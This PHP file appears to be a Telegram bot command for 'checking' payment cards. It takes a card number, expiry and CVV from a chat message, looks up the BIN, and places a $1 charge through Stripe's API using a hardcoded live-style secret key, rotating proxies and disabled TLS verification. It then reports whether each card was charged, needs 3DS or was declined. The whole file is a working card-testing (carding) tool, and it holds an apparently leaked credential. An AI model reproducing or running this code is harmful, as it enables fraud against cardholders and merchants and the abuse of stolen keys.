<?php


//========WHO CAN CHECK FUNC========//

//=====WHO CAN CHECK FUNC END======//



if(preg_match('/^(\/ccn|\.ccn|!ccn)/', $message)) {


        $lista = substr($message, 5);
        $separa = explode("|", $lista);
        $cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; 
        $mes = isset($separa[1]) ? $separa[1] : '';
        $ano = isset($separa[2]) ? $separa[2] : '';
        $cvv = isset($separa[3]) ? $separa[3] : '';

        $last4 = substr($cc, -4);
        

//$des = ("You");
$sent_message_id = send_reply($chatId, $message_id,$des, "<b>
  🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE 1$
Status: <code>□□□□□ 0%[🟥]</code>
Req: <code>@$username</code>
</b>");
//==============checker part============//
$sk = "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";
  
//===========Bin info===========//
  $bin = substr($lista, 0,6);
  $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = strtoupper(GetStr($fim, '"name":"', '"'));
$brand = strtoupper(GetStr($fim, '"brand":"', '"'));
$country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
$scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
$emoji = GetStr($fim, '"emoji":"', '"');
$type =strtoupper(GetStr($fim, '"type":"', '"'));

//===========Bin info end===========//  
  sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
  🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE 1$
Status: <code>■□□□□ 20%[⬛]</code>
Req: <code>@$username</code>
</b>");



sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
  🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE 1$
Status: <code>■■■□□ 50%[🟧]</code>
Req: <code>@$username</code>
</b>");
#-------------------[1st REQ]--------------------#
$x = 0;  
while(true)  
{  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.''); 
$result1 = curl_exec($ch);  
$tok1 = Getstr($result1,'"id": "','"');  
$msg = Getstr($result1,'"message": "','"');  
//echo "<br><b>Result1: </b> $result1<br>";  
if (strpos($result1, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}  
  
sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE 1$
Status: <code>■■■■□ 80%[🟨]</code>
Req: <code>@$username</code>
</b>");
#------------------[2nd REQ]--------------------#  
$x = 0;  
while(true)  
{  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&payment_method_types[]=card&description=Shadow Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
$result2 = curl_exec($ch);  
$dcode = trim(strip_tags(getStr($result2,'"decline_code": "','"')));
$tok2 = Getstr($result2,'"id": "','"');  
$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  
$riskl = Getstr($result2,'"risk_level": "','"');
$reason = Getstr($result2,'"reason": "','"');
$cvccheck = Getstr($result2,'"cvc_check": "','"');
$networkstatus = Getstr($result2,'"network_status": "','"');

  
if (strpos($result2, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}


sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
  🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE 1$
Status: <code>■■■■■ 100%[🟩]</code>
Req: <code>@$username</code>
</b>");


//===========Decline code=========//

//==============Response==========//
  if(strpos($result2, '"seller_message": "Payment complete."' )) {
  
$resp = "<b>
 [火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
• ┌CC: <code>$lista</code>
• ├Status: Charged 1$ ✅
• └Response: <code>'status':'succeeded'</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@sifatmusfique</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result2, "authentication_required")) {
$resp = "<b>
 [火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
• ┌CC: <code>$lista</code>
• ├Status: 3D_Required ✅
• └Response: <code>3ds2_fingerprint</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@sifatmusfique</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result2, "generic_decline") !== false || strpos($result1, "generic_decline") !== false) {

$resp = "<b>
 [火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Declined ❌
•└Response: <code>Generic Declined </code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@sifatmusfique</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card" ))){

  $resp = "<b>
 [火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Declined ❌
•└Response: <code>Expired card</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@sifatmusfique</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}
    

else {
$resp = "<b>
 [火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Declined ❌
•└Response: <code>$result2 </code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@sifatmusfique</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}
    
  }